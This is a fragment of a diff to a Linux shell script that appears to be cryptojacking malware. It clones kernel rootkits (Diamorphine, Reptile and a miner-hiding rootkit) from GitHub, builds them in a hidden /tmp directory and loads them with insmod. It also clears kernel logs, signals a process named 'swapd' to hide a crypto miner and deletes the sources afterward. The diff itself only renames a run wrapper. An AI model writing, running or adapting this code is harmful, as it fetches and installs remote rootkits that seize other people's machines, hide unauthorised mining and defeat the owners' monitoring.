@@ -704,7 +704,7 @@ zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools bu
 git clone https://github.com/m0nad/Diamorphine
 cd Diamorphine/
 make
-timeout_run insmod diamorphine.ko
+safe_run insmod diamorphine.ko
 dmesg -C
 kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 
@@ -751,7 +751,7 @@ install_reptile() {
 }
 
 dmesg -C
-timeout_run /reptile/reptile_cmd hide
+safe_run /reptile/reptile_cmd hide
     
     # Preserve SSH visibility
     SSHD_PID=$(pidof sshd)
@@ -791,7 +791,7 @@ echo "[*] hide crypto miner."
 cd /tmp
 cd .X11-unix
 git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make
-dmesg -C && timeout_run insmod rootkit.ko && dmesg
+dmesg -C && safe_run insmod rootkit.ko && dmesg
 kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
